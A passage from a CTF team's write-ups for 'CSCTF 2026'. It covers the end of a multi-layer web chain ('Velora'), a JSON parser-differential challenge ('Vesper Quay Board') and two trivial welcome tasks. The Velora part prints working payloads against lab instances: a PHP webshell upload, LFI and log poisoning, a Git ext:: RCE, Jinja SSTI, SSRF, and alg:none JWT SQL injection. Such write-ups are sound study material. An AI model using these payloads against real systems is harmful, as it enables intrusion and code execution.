- **L19** — step-up bypass. One `POST /api/graphql` mutation with 100,000 aliased fields, i.e. every
  5-digit code in a single request via GraphQL aliasing:
  `mutation{ aaa:verifyOtp(code:"00000"){ok} aab:verifyOtp(code:"00001"){ok} … }` (unique 3-letter alias
  per code). The server evaluates all of them in one request, so one of the 100,000 matches the real OTP
  without any rate limit ever tripping.
- **L20** — `GET /dashboard`, which renders `views/dashboard-pages/home.html`.
- **L21** — LFI in the page loader:
  `GET /dashboard?page=dashboard-pages/../../secret/schema.txt`, disclosing the `config(name,value)`
  schema, the Apache access-log path and the entrypoint. This was the longest stall: we worked through
  many directory/filename layouts under the loader before `secret/` served the file.
- **L22** — `GET /library?doc=library/../../../../../etc/apache2/mods-enabled/php.conf`, the PHP handler
  map, confirming that any filename *containing* `.php` is handed to the PHP interpreter
  (`application/x-httpd-php`).
- **L23** — upload a PHP webshell as `sh.php.png` with `Content-Type: image/png` via `POST /support`
  (body `<?php system($_GET["c"]); ?>`), then execute with `GET /uploads/sh.php.png?c=<cmd>`. Because the
  stored name still contains `.php`, the handler map from L22 runs it despite the `.png` tail;
  `?c=id` returns `uid=33(www-data)`.
- **L24** — log poisoning for a second shell: send a PHP payload in `User-Agent`
  (`<?php system($_GET["c"]); ?>`) on a plain `GET /`, then LFI the raw log through the loader:
  `GET /dashboard?page=dashboard-pages/../../../../../var/log/apache2/access.log&c=<cmd>`.
- **L25–L26** — read `/entrypoint.sh` (gives `RECON_USER=svc.settle`) and `/opt/velora/reconcile.env`
  (gives `RECON_PASS`) through those shells.
- **L27** — Git `remote-ext` RCE on the authenticated import desk (HTTP basic with the recovered
  `svc.settle` credentials): `POST /import` with
  `repo_url=ext::sh -c cat${IFS}/opt/velora/nightly.sh>&2`, which prints the nightly job and reveals that
  it calls `http://…/ledger/reconcile`.
- **L28** — SSTI in the demo form: `POST /request-demo` with
  `name={{ cycler.__init__.__globals__.os.popen('cat /root/velora/release.note').read() }}`; the release
  note reveals the navigator SQL query (`… FROM nav WHERE role='<role>' ORDER BY sort`).
- **L29** — SSRF with basic auth to the settlement worker:
  `GET /api/preview?url=http://svc.settle:<RECON_PASS>@2130706433:9200/ledger/reconcile`; this runs the
  settlement job, which writes `settlement_record` into the `config` table.
- **L30** — forge the JWT `role` claim to `x' UNION SELECT '/delay',sleep(3) #`. The navigator query
  builds `… FROM nav WHERE role='<role>' ORDER BY sort`; the `#` comments out the appended `ORDER BY`,
  and the gate records the time-based delay, proving the second-order injection reaches the backend.
- **L31** — forge the `role` to `x' UNION SELECT value,value FROM config WHERE name='settlement_record' #`
  in the same `alg:none` JWT; the navigator gate returns the `settlement_record` the L29 job wrote — the
  flag, `CSCTF{3spBuSbEmVF3aq8H7DigViR2}`.

**The full solver**

The entire chain is scripted end to end in [`9125-velora-solve.py`](9125-velora-solve.py) (JohnG4lt), with his own walkthrough in [`9125-velora-john-writeup.md`](9125-velora-john-writeup.md). Run it against a fresh instance with `python3 9125-velora-solve.py http://<instance>`. It builds one authenticated session (the mass-assigned `plan` and `memberId` from signup), reads the three rotating entry gates from the landing page, `robots.txt` and the app bundle, then walks every gate in order while carrying the accumulated proofs in the `X-Chain` header. The run has three phases:

- **Layers 1-20 - account trust and internal services.** The self-assigned member IDOR, the `alg:none` admin token, the forwarded-host SSRF into the internal fabric, loopback-as-decimal to reach the cache through the preview `dict://` handler, and the persisted-query GraphQL reads up to the aliased one-request OTP step-up.
- **Layers 21-29 - file read and code execution.** The page-loader LFI, the PHP handler-map upload, the log-poisoning second shell, the recovered service credentials, the `remote-ext` import RCE, the demo-form SSTI, and the authenticated SSRF that runs the settlement job.
- **Layers 30-31 - the navigator-injection gates.** Both forged in the same `alg:none` token: a timing probe that confirms the second-order injection reaches the backend, then the extraction that returns the settlement record.

The script prints each layer's result as it goes and ends on the settlement record.

**Why it works**

Each layer is a separate, self-contained flaw, and the proofs only chain them together. The ones that
carried the chain were trust in client-controlled data (signup fields, `alg:none` tokens, forwarded-host
headers, role claims passed into SQL) and internal services that assume loopback means trusted (Redis, the
settlement API). The last two gates need the injection in the dialect the backend actually parses: a
MySQL-style `sleep()` with `#` as the terminator. SQLite-style recursive-CTE delays and `/*` or `--`
terminators did not pass.

**Validation / reproduction**

Layer 31 returned the settlement record in two forms, as the `config` row and as a `settlement_record`
field — the same value layer 29 had just written, in the `CSCTF{...}` frame. The late gates were the
stall: earlier runs treated layers 30–31 as a request-lifecycle or parser problem and got nowhere. Once
that was ruled out and the gate was driven with a direct `alg:none` JWT `role` carrying a MySQL `sleep(3)`
/ `#` UNION, the chain landed and the service returned the flag. The guarded submission returned `correct`.

Reproduction summary: run `replay_chain.py <instance>` to drive L1–L20 (it writes `live_state.json`), then
`replay_21_29.py` for L21–L29 (which performs the file-read/RCE/SSTI steps and the L29 settlement write),
then fire the L30 timing JWT once and the L31 extraction JWT. Gotchas: read L1–L3's rotating gate ids fresh
each run; keep the `X-Chain` header current (all prior proofs, `|`-joined) on every gate; the webshell
filename must contain `.php` for the handler map to execute it; and the L30/L31 injection must use MySQL
syntax (`sleep()`, `#`), not SQLite.

JohnG4lt's `9125-velora-solve.py` reproduces the whole chain against a fresh instance from a single file, and `9125-velora-john-writeup.md` is a second, independent walkthrough of the same solve.

### Vesper Quay Board

> Web · Medium · Mohamed Amine Mzoughi  
> Points: 291 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{6SkxXyOrqeH23QGrxONbsjtc}
```

Returned by our own instance's quay as the `clearance_code`, submitted once and accepted on the first
try.

**Challenge**

> Ash Army operators forged a release warrant at Vesper Quay to divert a relief convoy, and the desk
> approved it under the sealed courier. The quay serves an allied nation in the Operation Dawn
> theatre; it logged a different courier, and the raw warrant was not kept. Stop the diversion. Only
> a correction signed by a release the quay actually runs is accepted, and that correction returns
> the verification code. The API reference is at `/v1/openapi.json` on the desk.

A per-team container challenge (`type: container`, `connection_type: web`, port 8080). No files were
attached (`files: []`), so everything came from the live API on the assigned instance (`<instance>`).
One 25-pt hint was offered; we did not unlock it.

Two phrases in the brief define the whole solve. "Approved under the sealed courier … logged a
different courier" says one warrant was read two different ways by two components — a **parser
differential**. "Signed by a release the quay actually runs" says the final correction must be signed
by code running on the quay (the back end), not by the desk (the front-end policy check).

**Approach / walkthrough**

*Step 1 — read the spec as two parsers.* The OpenAPI document at `/v1/openapi.json` described a
desk-to-quay differential. The two layers read different key spellings of the same JSON body:

| Layer | Keys it reads | What it enforces |
| --- | --- | --- |
| Desk (guard) | `Courier`, `Argv` (capitalised) | courier must be the approved/sealed one, `c-f7dd2a`; `Argv` must be empty or `["status"]` |
| Quay (executor) | `courier`, `argv` (exact lowercase) | for the **legacy** courier `c-615d02`, runs `python3 -I -c <code>` when `argv == ["-c", <code>]` |

The quay takes the legacy execution path only when **both** hold: the desk saw the approved courier
and the quay saw the legacy courier. One parser can never produce that combination. Two parsers
reading different key spellings can. (The per-layer behaviour is summarised from the solve log, which
does not separate what the spec stated from what probing confirmed.)

*Step 2 — send a dual-key body.* We posted one body carrying both key spellings:

```json
{
  "courier": "c-615d02",
  "argv": ["-c", "<python code>"],
  "Courier": "c-f7dd2a",
  "Argv": []
}
```

- Desk view: `Courier = c-f7dd2a` (approved), `Argv = []` (allowed) → the guard passes.
- Quay view: `courier = c-615d02` (legacy), `argv = ["-c", CODE]` → it runs `python3 -I -c CODE`.

The keys are not literal duplicates — they differ only in case, and one layer does case-insensitive
lookup while the other does exact-case. The policy check and the action read different fields of one
message. This is the same failure class as HTTP parameter pollution and JSON duplicate-key confusion.

*Step 3 — look around inside the child.* Inside the `python3 -I` child, the environment held
everything the quay uses to sign its own corrections:

- `STATION_SIGN`: path to an Ed25519 signing helper. It reads canonical bytes on stdin and writes a
  64-byte signature.
- `STATION_KEY`: a path to the station key (the log records only that it is a path; we did not open
  it).
- `EDGE_URL=http://127.0.0.1:8080`: the service's loopback address inside the container (8080 is also
  the exposed port), serving `/v1/corrections`.
- `SUBMISSION_ID`, `QUAY_ID`, `WARRANT_ID`, `COURIER_ID`: the quay's identifiers for the logged
  submission (our reading: the forged diverting warrant), which the correction references.

We never read the private key file. We used `STATION_SIGN` only as the station's own signing service
— the "release the quay actually runs." Every request stayed inside the assigned container: the
signing call ran in the child, and the correction went to the container's loopback `EDGE_URL`.

*Step 4 — sign and post the correction.* From inside the child, build the correction object with five
fields (`applied_primary`, `courier_id`, `quay_id`, `submission_id`, `warrant_id`), serialise it as
**RFC 8785 / JCS canonical JSON** (keys sorted, compact separators, no whitespace) so the bytes we
sign match the bytes the verifier rebuilds, pipe those bytes to `STATION_SIGN`, base64-encode the
64-byte signature, and `POST $EDGE_URL/v1/corrections` with the flat fields plus `signature`. The log
records that `applied_primary = false` was the value that verified (reading it as "undo the diversion"
is our interpretation).

```python
import os, json, base64, subprocess, urllib.request
body = {
    "applied_primary": False,
    "courier_id":    os.environ["COURIER_ID"],
    "quay_id":       os.environ["QUAY_ID"],
    "submission_id": os.environ["SUBMISSION_ID"],
    "warrant_id":    os.environ["WARRANT_ID"],
}
canon = json.dumps(body, sort_keys=True, separators=(",", ":")).encode()   # JCS for this flat ASCII object
sig = subprocess.run([os.environ["STATION_SIGN"]], input=canon, capture_output=True).stdout  # 64 bytes
req = dict(body, signature=base64.b64encode(sig).decode())
r = urllib.request.Request(os.environ["EDGE_URL"] + "/v1/corrections",
                           data=json.dumps(req).encode(),
                           headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(r).read().decode())   # -> clearance_code
```

The quay verified the signature and the `applied_primary=false` correction, then returned a
`clearance_code`, which is the flag. (The exact script was not saved; this is a reconstruction of the
logged steps. Whether `STATION_SIGN` takes the key path as an argument or reads `STATION_KEY` itself
is not recorded — the sketch assumes the latter. For a flat object of ASCII strings and booleans,
`json.dumps(sort_keys=True, separators=(",", ":"))` gives the same bytes as JCS; nested objects or
non-integer numbers would need a real RFC 8785 implementation.)

**Why it works**

The policy check and the action read different fields of the same JSON object: the desk looks up
capitalised keys, the quay looks up exact lowercase keys, so one body carries a benign request for the
guard and a code-execution request for the executor. Once code runs inside the quay, its trusted
signing service will sign whatever it is given, and canonicalising with JCS makes the signed bytes
match exactly what the verifier reconstructs — so a correction we authored is accepted as a
legitimate, quay-signed release, without ever touching the private key.

**Validation / reproduction**

The live `/v1/corrections` endpoint verified the signature and returned the `clearance_code`; it was
submitted once through `./csctf submit` and accepted as correct (`tried.json`: one attempt, status
`correct`).

Repro summary: read `/v1/openapi.json` → POST the dual-key body (`courier`/`argv` legacy +
`Courier`/`Argv` approved) to the desk's warrant route → inside the `-c` child, read the
`SUBMISSION_ID`/`QUAY_ID`/`WARRANT_ID`/`COURIER_ID` env vars → build the five-field correction with
`applied_primary=false`, JCS-canonicalise, sign with `STATION_SIGN`, base64 the signature → POST to
`$EDGE_URL/v1/corrections` → read `clearance_code`.

Gotchas: the two key spellings must both be present in one body; canonicalisation must match the
verifier's (sorted keys, no whitespace) or the Ed25519 check fails; keep every call inside the
container's loopback. The dual-key correction route is `POST /v1/corrections`: it takes the flat
five-field JSON object (`applied_primary`, `courier_id`, `quay_id`, `submission_id`, `warrant_id`,
with `applied_primary=false`), serialized as RFC 8785 / JCS canonical JSON, Ed25519-signed via
`STATION_SIGN` with the base64 signature added as an extra field; the quay verifies it and returns the
`clearance_code`, which is the flag.

Codex, run under human steering, recovered this solve; the team verified and submitted once (byline:
secretNinja).


## Welcome

### Comms Check

> Welcome · Welcome · Chronos Security  
> Points: 100 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

The recognition word is the **#rules** channel topic on the event Discord, prefixed `2026:`. It is channel metadata (not a `CSCTF{...}` value and not a message), visible only to server members, so it is not reproduced here.

**Challenge**

> Comms check. Our net runs on Discord. Fall in with the rest of the fleet and report the recognition word the watch is broadcasting.

No files and no instance.

**Tools used**

A Discord account and client (the desktop or web app).

**Approach / walkthrough**

1. **Rule out the public surfaces first.** Our automated agents had no Discord session, so they checked what is visible without joining: the public server widget (sampled repeatedly for a bot status), the invite preview, and the event site. None of these exposed the word, so the task went to a human team member — the word is members-only channel metadata, so time spent on public surfaces is wasted.

2. **Join the event server.** Use the "Join Discord" link on the event page (`https://www.chronos-security.ro/competitions/csctf-2026`), which points to `discord.gg/GucSYEKvHP`, and accept the invite.

3. **Show all channels.** In the left-hand server list, right-click the server icon and choose **Show All Channels**. Discord's onboarding only lists the channels you opted into, and **#rules** is not one of them by default.

4. **Read the channel topic.** Open **#rules** and view its topic (clicking the topic in the channel header, or right-click → View Channel Details). The recognition word is the channel topic, prefixed `2026:` — it is in the channel's metadata, not posted as a message.

5. **Submit** the value exactly as shown.

**Why it works**

The flag is channel metadata rather than a message: it sits in the #rules topic/description, and #rules is hidden from the default channel list. Only server members can see channel details, so nothing outside the server gives it away — which is the point. It is a sanity check that each team has actually joined the support channel. Chronos has done this before: the 2024 edition hid its rules flag in a channel description too.

**Validation / reproduction**

The value was copied verbatim from the #rules channel topic and accepted on submission. To reproduce: join via the event-page invite, enable Show All Channels, open #rules, and read the topic.

### Welcome Aboard

> Welcome · Welcome · Chronos Security  
> Points: 100 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{w3lcome_aboard_operator_a17f}`

**Challenge**

> Welcome aboard, operator. Command sent your first transmission encoded. Decode it and report in.
>
> `Q1NDVEZ7dzNsY29tZV9hYm9hcmRfb3BlcmF0b3JfYTE3Zn0=`

No attachments and no instance — the whole challenge is the one string in the brief.

**Tools used**

None beyond standard CLI utilities (`base64`); CyberChef's "From Base64" does the same in a browser.

**Approach / walkthrough**

1. **Recognize the encoding.** The string uses only `A–Z a–z 0–9 + /` and ends in `=` padding, which is Base64. The flag wrapper is even visible before decoding: `Q1NDVEZ7` is exactly what `CSCTF{` becomes in Base64, so this is a single Base64 layer over a `CSCTF{...}` flag.

2. **Decode once.** Our intake pass decodes text found in each brief automatically; it flagged this as Base64 and decoded it, equivalent to:

   ```sh
   printf '%s' 'Q1NDVEZ7dzNsY29tZV9hYm9hcmRfb3BlcmF0b3JfYTE3Zn0=' | base64 -d; echo
   # CSCTF{w3lcome_aboard_operator_a17f}
   ```

   The output is the flag in plain text, and it went straight to submission.

**Why it works**

The brief carries the flag itself under one layer of Base64. This is a sanity check that the team can read a challenge and submit a flag — decode once and you are done.

**Validation / reproduction**

The decoded output is printable ASCII inside the `CSCTF{...}` frame. It was accepted on the first submission, about a minute and a half after the wave opened. To reproduce, paste the brief string into `base64 -d` (or CyberChef's "From Base64").
